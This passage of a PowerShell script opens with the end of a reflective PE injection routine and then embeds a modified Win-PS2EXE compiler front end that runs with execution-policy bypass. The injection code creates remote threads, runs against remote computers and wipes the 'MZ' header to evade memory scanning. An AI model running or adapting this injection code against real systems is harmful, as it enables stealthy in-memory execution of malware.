            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }
    
    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}

 
# Convert base64 string to byte array
 
#$PEBytes = [System.Convert]::FromBase64String($InputString)
 
# Run EXE in memory
 
Invoke-ReflectivePEInjection -PEBytes $PEBytes # -ExeArgs "Arg1 Arg2 Arg3 Arg4"
}

function func_ps2exe2
{
<# fragile test to see if PS 5.1 is installed #>
if (![System.IO.File]::Exists("$env:SystemRoot" + "\\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.ConsoleHost\v4.0_3.0.0.0__31bf3856ad364e35\microsoft.powershell.consolehost.dll")) {
    func_ps51 }

$win_ps2exe = @'

$refAssemblies = @( <# FIXME Too lazy to find out which refassemblies are needed so included everything ...#>

"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Activities.Core.Presentation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Activities.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Activities.DurableInstancing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Activities.Presentation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.AddIn.Contract.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.AddIn.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.AppContext.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Collections.Concurrent.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Collections.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Collections.NonGeneric.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Collections.Specialized.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.Annotations.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.Composition.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\system.componentmodel.composition.registration.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.DataAnnotations.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.EventBasedAsync.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ComponentModel.TypeConverter.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Configuration.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Configuration.Install.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Console.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Core.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Common.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.DataSetExtensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Entity.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Entity.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Linq.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.OracleClient.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Services.Client.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Services.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.Services.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.SqlXml.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Deployment.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Device.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.Contracts.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.Debug.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.FileVersionInfo.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.Process.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.StackTrace.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.TextWriterTraceListener.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.Tools.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.TraceSource.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Diagnostics.Tracing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.DirectoryServices.AccountManagement.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.DirectoryServices.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.DirectoryServices.Protocols.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Drawing.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Drawing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Drawing.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Dynamic.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Dynamic.Runtime.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.EnterpriseServices.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Globalization.Calendars.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Globalization.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Globalization.Extensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IdentityModel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IdentityModel.Selectors.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IdentityModel.Services.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.Compression.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.Compression.FileSystem.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.Compression.ZipFile.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.FileSystem.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.FileSystem.DriveInfo.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.FileSystem.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.FileSystem.Watcher.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.IsolatedStorage.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.Log.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.MemoryMappedFiles.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.Pipes.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.IO.UnmanagedMemoryStream.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Linq.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Linq.Expressions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Linq.Parallel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Linq.Queryable.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Management.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Management.Instrumentation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Messaging.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Http.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Http.Rtc.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Http.WebRequest.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.NameResolution.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.NetworkInformation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Ping.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Requests.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Security.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Sockets.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.WebHeaderCollection.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.WebSockets.Client.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.WebSockets.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Numerics.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Numerics.Vectors.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ObjectModel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.context.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.Emit.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.Emit.ILGeneration.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.Emit.Lightweight.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.Extensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Reflection.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Resources.Reader.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Resources.ResourceManager.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Resources.Writer.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Caching.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.CompilerServices.VisualC.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.DurableInstancing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Extensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Handles.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.InteropServices.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.InteropServices.RuntimeInformation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.InteropServices.WindowsRuntime.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Numerics.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Remoting.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.Formatters.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.Formatters.Soap.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.Json.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Runtime.Serialization.Xml.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Claims.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Cryptography.Algorithms.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Cryptography.Csp.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Cryptography.Encoding.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Cryptography.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Cryptography.X509Certificates.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.Principal.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.SecureString.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Activation.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Activities.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Channels.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Discovery.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Duplex.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Http.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Internals.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.NetTcp.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Primitives.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Routing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Security.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.ServiceMoniker40.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.WasHosting.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.Web.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ServiceProcess.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Text.Encoding.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Text.Encoding.Extensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Text.RegularExpressions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.Overlapped.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.Tasks.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.Tasks.Parallel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.Thread.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.ThreadPool.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Threading.Timer.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Transactions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.ValueTuple.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Abstractions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.ApplicationServices.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.DataVisualization.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.DataVisualization.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.DynamicData.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.DynamicData.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Entity.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Entity.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Extensions.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Extensions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Mobile.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.RegularExpressions.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Routing.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.Services.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Windows.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Windows.Forms.DataVisualization.Design.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Windows.Forms.DataVisualization.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Windows.Forms.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.Activities.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.Runtime.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.WorkflowServices.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xaml.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xaml.Hosting.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.XML.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.Linq.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.ReaderWriter.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.Serialization.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.XDocument.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.XmlDocument.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.XmlSerializer.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.XPath.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\System.Xml.XPath.XDocument.dll"


"c:\windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationCore.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationFrameWork.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\WPF\WindowsBase.dll"
"c:\windows\Microsoft.NET\Framework64\v4.0.30319\WPF\System.Windows.Presentation.dll"


"c:\windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.dll"
)

Add-Type -ReferencedAssemblies $refAssemblies -TypeDefinition @"
// Win-PS2EXE v1.0.1.1
// Front end to Powershell-Script-to-EXE-Compiler PS2EXE.ps1: https://github.com/MScholtes/TechNet-Gallery
// Markus Scholtes, 2021
//
// WPF "all in one file" program, no Visual Studio or MSBuild is needed to compile
// Version for .Net 4.x

/* compile with:
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe Win-PS2EXE.cs /r:"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\WPF\presentationframework.dll" /r:"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\WPF\windowsbase.dll" /r:"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\WPF\presentationcore.dll" /r:"%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\System.Xaml.dll" /win32icon:MScholtes.ico
*/

using System;
//using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Markup;
using System.Xml;



// set attributes
using System.Reflection;
[assembly:AssemblyTitle("Graphical front end to PS2EXE.ps1")]
[assembly:AssemblyDescription("Graphical front end to PS2EXE.ps1")]
[assembly:AssemblyConfiguration("")]
[assembly:AssemblyCompany("MS")]
[assembly:AssemblyProduct("Win-PS2EXE")]
[assembly:AssemblyCopyright("� Markus Scholtes 2021")]
[assembly:AssemblyTrademark("")]
[assembly:AssemblyCulture("")]
[assembly:AssemblyVersion("1.0.1.1")]
[assembly:AssemblyFileVersion("1.0.1.1")]


namespace WPFApplication
{
	public class CustomWindow : Window
	{
		// create window object out of XAML string
		public static CustomWindow LoadWindowFromXaml(string xamlString)
		{ // Get the XAML content from a string.
			// prepare XML document
			XmlDocument XAML = new XmlDocument();
			// read XAML string
			XAML.LoadXml(xamlString);
			// and convert to XML
			XmlNodeReader XMLReader = new XmlNodeReader(XAML);
			// generate WPF object tree
			CustomWindow objWindow = (CustomWindow)XamlReader.Load(XMLReader);

			// return CustomWindow object
			return objWindow;
		}

		// helper function that "climbs up" the parent object chain from a window object until the root window object is reached
		private FrameworkElement FindParentWindow(object sender)
		{
			FrameworkElement GUIControl = (FrameworkElement)sender;
			while ((GUIControl.Parent != null) && (GUIControl.GetType() != typeof(CustomWindow)))
			{
				GUIControl = (FrameworkElement)GUIControl.Parent;
			}

			if (GUIControl.GetType() == typeof(CustomWindow))
				return GUIControl;
			else
				return null;
		}

		// event handlers

		// left mouse click
		private void Button_Click(object sender, RoutedEventArgs e)
		{
			// event is handled afterwards
			e.Handled = true;

			// retrieve window parent object
			Window objWindow = (Window)FindParentWindow(sender);
			// if not found then end
			if (objWindow == null) { return; }

			if (((Button)sender).Name == "Cancel")
			{	// button "Cancel" -> close window
				objWindow.Close();
			}
			else
			{	// button "Compile" -> call PS2EXE
				string directoryOfExecutable = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
				if (directoryOfExecutable.StartsWith("file:\\") || directoryOfExecutable.StartsWith("http:\\")) { directoryOfExecutable = directoryOfExecutable.Substring(6); }

				// read content of TextBox control
				TextBox objSourceFile = (TextBox)objWindow.FindName("SourceFile");
				if (objSourceFile.Text == "")
				{
					MessageBox.Show("No source file specified", "Compile", MessageBoxButton.OK, MessageBoxImage.Error);
					return;
				}
                               /****************************************************************************/
                               /*                    Modified line from original scipt                     */  
                               /****************************************************************************/
				string arguments = "-NoProfile -NoLogo -EP Bypass -Command \"& '" + /*directoryOfExecutable*/ System.IO.Path.GetTempPath() + "\\ps2exe.ps1' -inputFile '" + objSourceFile.Text + "'";

				// read content of TextBox control
				TextBox objTargetFile = (TextBox)objWindow.FindName("TargetFile");
				if (objTargetFile.Text != "")
				{
					if (System.IO.Directory.Exists(objTargetFile.Text))
					{ // if directory then append source file name
						arguments += " -outputFile '" + System.IO.Path.Combine(objTargetFile.Text, System.IO.Path.GetFileNameWithoutExtension(objSourceFile.Text)) + ".exe'";
					}
					else
						arguments += " -outputFile '" + objTargetFile.Text + "'";
				}

				// read content of TextBox control
				TextBox objIconFile = (TextBox)objWindow.FindName("IconFile");
				if (objIconFile.Text != "")
				{
					arguments += " -iconFile '" + objIconFile.Text + "'";
				}

				// read content of TextBox control
				TextBox objFileVersion = (TextBox)objWindow.FindName("FileVersion");
				if (objFileVersion.Text != "")
				{
					arguments += " -version '" + objFileVersion.Text + "'";
				}

				// read content of TextBox control
				TextBox objFileDescription = (TextBox)objWindow.FindName("FileDescription");
				if (objFileDescription.Text != "")
				{
					arguments += " -title '" + objFileDescription.Text + "'";
				}

				// read content of TextBox control
				TextBox objProductName = (TextBox)objWindow.FindName("ProductName");
				if (objProductName.Text != "")
				{
					arguments += " -product '" + objProductName.Text + "'";
				}

				// read content of TextBox control
				TextBox objCopyright = (TextBox)objWindow.FindName("Copyright");
				if (objCopyright.Text != "")
				{
					arguments += " -copyright '" + objCopyright.Text + "'";
				}

				// read state of CheckBox control
				CheckBox objCheckBox = (CheckBox)objWindow.FindName("noConsole");
				if (objCheckBox.IsChecked.Value)
				{
					arguments += " -noConsole";
				}

				// read state of CheckBox control
				CheckBox objCheckBox2 = (CheckBox)objWindow.FindName("noOutput");
				if (objCheckBox2.IsChecked.Value)
				{
					arguments += " -noOutput";
				}

				// read state of CheckBox control
				CheckBox objCheckBox3 = (CheckBox)objWindow.FindName("noError");
				if (objCheckBox3.IsChecked.Value)
				{
					arguments += " -noError";
				}

				// read state of CheckBox control
				CheckBox objCheckBox4 = (CheckBox)objWindow.FindName("requireAdmin");
				if (objCheckBox4.IsChecked.Value)
				{
					arguments += " -requireAdmin";
				}

				// read state of CheckBox control
				CheckBox objCheckBox5 = (CheckBox)objWindow.FindName("configFile");
				if (objCheckBox5.IsChecked.Value)
				{
					arguments += " -configFile";
				}

				// read state of RadioButton control
				RadioButton objRadioButton = (RadioButton)objWindow.FindName("STA");
				if (objRadioButton.IsChecked.Value)
				{
					arguments += " -STA";
				}
				else
				{
					arguments += " -MTA";
				}

				// read content of ComboBox control
				ComboBox objComboBox = (ComboBox)objWindow.FindName("Platform");
				ComboBoxItem objComboBoxItem = (ComboBoxItem)objComboBox.SelectedItem;
				string selectedItem = objComboBoxItem.Content.ToString();
				if (selectedItem != "AnyCPU")
				{
					if (selectedItem == "x64")
					{
						arguments += " -x64";
					}
					else
					{
						arguments += " -x86";
					}
				}

				// create powershell process with ps2exe command line

                               /****************************************************************************/
                               /*                    Modified line from original scipt                     */  
                               /****************************************************************************/
				//ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", arguments + " -verbose; Read-Host \\\"Press Enter to leave\\\"\"");
				ProcessStartInfo psi = new ProcessStartInfo("ps51.exe", arguments + " -verbose");//; Read-Host \\\"Press Enter to leave\\\"\"");
				// working directory is the directory of the source file
				psi.WorkingDirectory = System.IO.Path.GetDirectoryName(System.IO.Path.GetFullPath(objSourceFile.Text));
				psi.UseShellExecute = false;

				try
				{ // start process
					Process.Start(psi);
				}
				catch (System.ComponentModel.Win32Exception ex)
				{ // error
					MessageBox.Show("Error " + ex.NativeErrorCode + " starting the process\r\n" + ex.Message + "\r\n", "Compile", MessageBoxButton.OK, MessageBoxImage.Error);
				}
				catch (System.InvalidOperationException ex)
				{ // error
					MessageBox.Show("Error starting the process\r\n" + ex.Message + "\r\n", "Compile", MessageBoxButton.OK, MessageBoxImage.Error);
				}

			}
		}

		// mouse moves into button area
		private void Button_MouseEnter(object sender, MouseEventArgs e)
		{
			// retrieve window parent object
			Window objWindow = (Window)FindParentWindow(sender);
			// if found change mouse form
			if (objWindow != null) { objWindow.Cursor = System.Windows.Input.Cursors.Hand; }
		}

		// mouse moves out of button area
		private void Button_MouseLeave(object sender, MouseEventArgs e)
		{
			// retrieve window parent object
			Window objWindow = (Window)FindParentWindow(sender);
			// if found change mouse form
			if (objWindow != null) { objWindow.Cursor = System.Windows.Input.Cursors.Arrow; }
		}

		// click on file picker button ("...")
		private void FilePicker_Click(object sender, RoutedEventArgs e)
		{
			// retrieve window parent object
			Window objWindow = (Window)FindParentWindow(sender);

			// if not found then end
			if (objWindow == null) { return; }

			if (((Button)sender).Name != "TargetFilePicker")
			{
				// create OpenFileDialog control
				Microsoft.Win32.OpenFileDialog objFileDialog = new Microsoft.Win32.OpenFileDialog();

				// set file extension filters
				if (((Button)sender).Name == "SourceFilePicker")
				{	// button to TextBox "SourceFile"
					objFileDialog.DefaultExt = ".ps1";
					objFileDialog.Filter = "PS1 Files (*.ps1)|*.ps1|All Files (*.*)|*.*";
				}
				else
				{	// button to TextBox "IconFile"
					objFileDialog.DefaultExt = ".ico";
					objFileDialog.Filter = "Icon Files (*.ico)|*.ico|All Files (*.*)|*.*";
				}

				// display file picker dialog
				Nullable<bool> result = objFileDialog.ShowDialog();

				// file selected?
				if (result.HasValue && result.Value)
				{ // fill Texbox with file name
					if (((Button)sender).Name == "SourceFilePicker")
					{	// button to TextBox "SourceFile"
